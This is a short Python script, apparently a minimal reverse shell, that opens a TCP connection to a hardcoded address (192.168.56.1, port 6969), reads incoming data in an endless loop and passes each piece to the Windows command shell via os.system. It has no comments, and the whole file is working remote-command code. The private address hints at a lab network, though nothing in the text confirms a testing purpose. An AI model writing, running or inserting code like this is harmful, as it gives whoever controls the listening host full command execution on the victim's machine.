import socket
import os

host = "192.168.56.1"
port = 6969

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))

while True:
    data = sock.recv(1024)
    os.system('cmd /k' + data.decode())
